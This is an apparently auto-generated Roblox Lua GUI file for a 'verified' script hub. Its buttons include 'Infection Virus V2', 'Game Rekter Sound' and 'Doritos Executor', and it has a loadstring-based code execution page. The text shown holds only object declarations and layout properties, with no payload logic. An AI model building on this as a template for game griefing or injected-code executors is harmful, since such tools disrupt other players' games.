--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection
G2L["205"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.UICorner
G2L["206"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.ServerEventHandler
G2L["207"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.TextButton_Roundify_12px
G2L["208"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.shadowHolder
G2L["209"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.shadowHolder.umbraShadow
G2L["210"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.shadowHolder.penumbraShadow
G2L["211"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.shadowHolder.ambientShadow
G2L["212"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns
G2L["213"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.TextButton_Roundify_12px
G2L["214"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.RippleClick
G2L["215"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.RippleClick.Circle
G2L["216"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.UICorner
G2L["217"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.ServerEventHandler
G2L["218"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.shadowHolder
G2L["219"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.shadowHolder.umbraShadow
G2L["220"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.shadowHolder.penumbraShadow
G2L["221"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.shadowHolder.ambientShadow
G2L["222"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns
G2L["223"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.TextButton_Roundify_12px
G2L["224"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.RippleClick
G2L["225"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.RippleClick.Circle
G2L["226"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.UICorner
G2L["227"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.ServerEventHandler
G2L["228"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.shadowHolder
G2L["229"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.shadowHolder.umbraShadow
G2L["230"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.shadowHolder.penumbraShadow
G2L["231"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.shadowHolder.ambientShadow
G2L["232"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui
G2L["233"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.UICorner
G2L["234"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.TextButton_Roundify_12px
G2L["235"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.shadowHolder
G2L["236"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.shadowHolder.umbraShadow
G2L["237"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.shadowHolder.penumbraShadow
G2L["238"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.shadowHolder.ambientShadow
G2L["239"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.Script
G2L["240"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.LocalScript
G2L["241"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.RemoteEvent
G2L["242"] = Instance.new("RemoteEvent")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi
G2L["243"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.TextButton_Roundify_12px
G2L["244"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.RippleClick
G2L["245"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.RippleClick.Circle
G2L["246"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.UICorner
G2L["247"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.shadowHolder
G2L["248"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.shadowHolder.umbraShadow
G2L["249"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.shadowHolder.penumbraShadow
G2L["250"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.shadowHolder.ambientShadow
G2L["251"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.RemoteEvent
G2L["252"] = Instance.new("RemoteEvent")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.Script
G2L["253"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.LocalScript
G2L["254"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin
G2L["255"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.TextButton_Roundify_12px
G2L["256"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.RippleClick
G2L["257"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.RippleClick.Circle
G2L["258"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.UICorner
G2L["259"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.ServerEventHandler
G2L["260"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.shadowHolder
G2L["261"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.shadowHolder.umbraShadow
G2L["262"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.shadowHolder.penumbraShadow
G2L["263"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.shadowHolder.ambientShadow
G2L["264"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2
G2L["265"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.TextButton_Roundify_12px
G2L["266"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.RippleClick
G2L["267"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.RippleClick.Circle
G2L["268"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.UICorner
G2L["269"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.shadowHolder
G2L["270"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.shadowHolder.umbraShadow
G2L["271"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.shadowHolder.penumbraShadow
G2L["272"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.shadowHolder.ambientShadow
G2L["273"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.RemoteEvent
G2L["274"] = Instance.new("RemoteEvent")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.Script
G2L["275"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.LocalScript
G2L["276"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton
G2L["277"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.UICorner
G2L["278"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.Script
G2L["279"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder
G2L["280"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.umbraShadow
G2L["281"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.penumbraShadow
G2L["282"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.ambientShadow
G2L["283"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.TextButton_Roundify_12px
G2L["284"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet
G2L["285"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.RippleClick
G2L["286"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.RippleClick.Circle
G2L["287"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.shadowHolder
G2L["288"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.shadowHolder.umbraShadow
G2L["289"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.shadowHolder.penumbraShadow
G2L["290"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.shadowHolder.ambientShadow
G2L["291"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.TextButton_Roundify_12px
G2L["292"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.UICorner
G2L["293"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga
G2L["294"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.UICorner
G2L["295"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.shadowHolder
G2L["296"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.shadowHolder.umbraShadow
G2L["297"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.shadowHolder.penumbraShadow
G2L["298"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.shadowHolder.ambientShadow
G2L["299"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.TextButton_Roundify_12px
G2L["300"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script
G2L["301"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule
G2L["302"] = Instance.new("ModuleScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui
G2L["303"] = Instance.new("ScreenGui")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.LocalScript
G2L["304"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.Part
G2L["305"] = Instance.new("Sound")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.RemoteEvent
G2L["306"] = Instance.new("RemoteEvent")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.Part2
G2L["307"] = Instance.new("Sound")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.ImageLabel
G2L["308"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.GlitchedOB
G2L["309"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.GLITCHEDSFX
G2L["310"] = Instance.new("Sound")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.Loop
G2L["311"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge
G2L["312"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.RippleClick
G2L["313"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.RippleClick.Circle
G2L["314"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.UICorner
G2L["315"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.TextButton_Roundify_12px
G2L["316"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.ServerEventHandler
G2L["317"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.shadowHolder
G2L["318"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.shadowHolder.umbraShadow
G2L["319"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.shadowHolder.penumbraShadow
G2L["320"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.shadowHolder.ambientShadow
G2L["321"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns
G2L["322"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.TextButton_Roundify_12px
G2L["323"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.RippleClick
G2L["324"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.RippleClick.Circle
G2L["325"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.UICorner
G2L["326"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.shadowHolder
G2L["327"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.shadowHolder.umbraShadow
G2L["328"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.shadowHolder.penumbraShadow
G2L["329"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.shadowHolder.ambientShadow
G2L["330"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.RemoteEvent
G2L["331"] = Instance.new("RemoteEvent")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.Script
G2L["332"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.LocalScript
G2L["333"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal
G2L["334"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.UICorner
G2L["335"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.shadowHolder
G2L["336"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.shadowHolder.umbraShadow
G2L["337"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.shadowHolder.penumbraShadow
G2L["338"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.shadowHolder.ambientShadow
G2L["339"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.TextButton_Roundify_12px
G2L["340"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.Script
G2L["341"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox
G2L["342"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.TextButton_Roundify_12px
G2L["343"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.Script
G2L["344"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.shadowHolder
G2L["345"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.shadowHolder.umbraShadow
G2L["346"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.shadowHolder.penumbraShadow
G2L["347"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.shadowHolder.ambientShadow
G2L["348"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint
G2L["349"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.TextButton_Roundify_12px
G2L["350"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.shadowHolder
G2L["351"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.shadowHolder.umbraShadow
G2L["352"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.shadowHolder.penumbraShadow
G2L["353"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.shadowHolder.ambientShadow
G2L["354"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.UICorner
G2L["355"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.Script
G2L["356"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound
G2L["357"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.UICorner
G2L["358"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.shadowHolder
G2L["359"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.shadowHolder.umbraShadow
G2L["360"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.shadowHolder.penumbraShadow
G2L["361"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.shadowHolder.ambientShadow
G2L["362"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.TextButton_Roundify_12px
G2L["363"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.Script
G2L["364"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ]
G2L["365"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].UICorner
G2L["366"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].shadowHolder
G2L["367"] = Instance.new("Frame")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].shadowHolder.umbraShadow
G2L["368"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].shadowHolder.penumbraShadow
G2L["369"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].shadowHolder.ambientShadow
G2L["370"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].TextButton_Roundify_12px
G2L["371"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].Script
G2L["372"] = Instance.new("Script")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].LocalScript
G2L["373"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].RemoteEvent
G2L["374"] = Instance.new("RemoteEvent")

--verified.Frame.ImageLabel.UICorner
G2L["375"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.Next
G2L["376"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.Next.LocalScript
G2L["377"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.ImageLabel
G2L["378"] = Instance.new("ImageLabel")

--verified.Frame.ImageLabel.Page 2
G2L["379"] = Instance.new("ScrollingFrame")

--verified.Frame.ImageLabel.Page 2.ImageButton
G2L["380"] = Instance.new("ImageButton")

--verified.Frame.ImageLabel.Page 2.ImageButton.LocalScript
G2L["381"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.Page 2.ImageButton
G2L["382"] = Instance.new("ImageButton")

--verified.Frame.ImageLabel.Page 2.ImageButton.LocalScript
G2L["383"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.Page 2.TextButton
G2L["384"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.Page 2.TextButton.LocalScript
G2L["385"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.Page 2.TextButton
G2L["386"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.Page 2.TextButton.LocalScript
G2L["387"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.TitleShadow
G2L["388"] = Instance.new("TextLabel")

--verified.Frame.ImageLabel.TitleShadow.shadowHolder
G2L["389"] = Instance.new("Frame")

--verified.Frame.ImageLabel.TitleShadow.UICorner
G2L["390"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.Close
G2L["391"] = Instance.new("ImageButton")

--verified.Frame.ImageLabel.Close.LocalScript
G2L["392"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.Page 3
G2L["393"] = Instance.new("ScrollingFrame")

--verified.Frame.ImageLabel.Page 3.Execute
G2L["394"] = Instance.new("TextButton")

--verified.Frame.ImageLabel.Page 3.Execute.yes'
G2L["395"] = Instance.new("Folder")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script
G2L["396"] = Instance.new("Script")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring
G2L["397"] = Instance.new("ModuleScript")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaZ
G2L["398"] = Instance.new("ModuleScript")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaX
G2L["399"] = Instance.new("ModuleScript")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaY
G2L["400"] = Instance.new("ModuleScript")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaU
G2L["401"] = Instance.new("ModuleScript")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaP
G2L["402"] = Instance.new("ModuleScript")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaK
G2L["403"] = Instance.new("ModuleScript")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LBI
G2L["404"] = Instance.new("ModuleScript")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.LocalScript
G2L["405"] = Instance.new("LocalScript")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.RemoteEvent
G2L["406"] = Instance.new("RemoteEvent")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.buton
G2L["407"] = Instance.new("ObjectValue")

--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.text
G2L["408"] = Instance.new("ObjectValue")

--verified.Frame.ImageLabel.Page 3.Box
G2L["409"] = Instance.new("TextBox")

--verified.Frame.ImageLabel.search
G2L["410"] = Instance.new("TextBox")

--verified.Frame.ImageLabel.search.UICorner
G2L["411"] = Instance.new("UICorner")

--verified.Frame.ImageLabel.LocalScript
G2L["412"] = Instance.new("LocalScript")

--verified.Frame.Open
G2L["413"] = Instance.new("TextButton")

--verified.Frame.Open.LocalScript
G2L["414"] = Instance.new("LocalScript")



--[[
    Properties:
--]]
--verified
G2L["0"].Name = [[verified]]
G2L["0"].Enabled = true
G2L["0"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
G2L["0"].Parent = game.Players.LocalPlayer.PlayerGui

--verified.Frame
G2L["1"].Name = [[Frame]]
G2L["1"].Active = false
G2L["1"].AnchorPoint = Vector2.new(0, 0)
G2L["1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["1"].BackgroundTransparency = 1
G2L["1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
G2L["1"].BorderSizePixel = 0
G2L["1"].ClipsDescendants = false
G2L["1"].Draggable = false
G2L["1"].Position = UDim2.new(0, 0, 0, 0)
G2L["1"].Rotation = 0
G2L["1"].Selectable = false
G2L["1"].SelectionOrder = 0
G2L["1"].Size = UDim2.new(0, 100, 0, 100)
G2L["1"].Visible = true
G2L["1"].ZIndex = 1
G2L["1"].Parent = G2L["0"]

--verified.Frame.ImageLabel
G2L["2"].Name = [[ImageLabel]]
G2L["2"].Image = [[rbxassetid://7215667169]]
G2L["2"].ImageColor3 = Color3.fromRGB(255, 255, 255)
G2L["2"].ScaleType = Enum.ScaleType.Stretch
G2L["2"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["2"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["2"].Active = false
G2L["2"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["2"].BackgroundTransparency = 0
G2L["2"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["2"].BorderSizePixel = 0
G2L["2"].ClipsDescendants = false
G2L["2"].Draggable = false
G2L["2"].Position = UDim2.new(4.46066, 0, 1.7034298, 243)
G2L["2"].Rotation = 0
G2L["2"].Selectable = false
G2L["2"].SelectionOrder = 0
G2L["2"].Size = UDim2.new(0, 638, 0, 653)
G2L["2"].Visible = true
G2L["2"].ZIndex = 1
G2L["2"].Parent = G2L["1"]

--verified.Frame.ImageLabel.Dragify
G2L["3"].Name = [[Dragify]]
G2L["3"].Parent = G2L["2"]

--verified.Frame.ImageLabel.Tween
G2L["4"].Name = [[Tween]]
G2L["4"].Parent = G2L["2"]

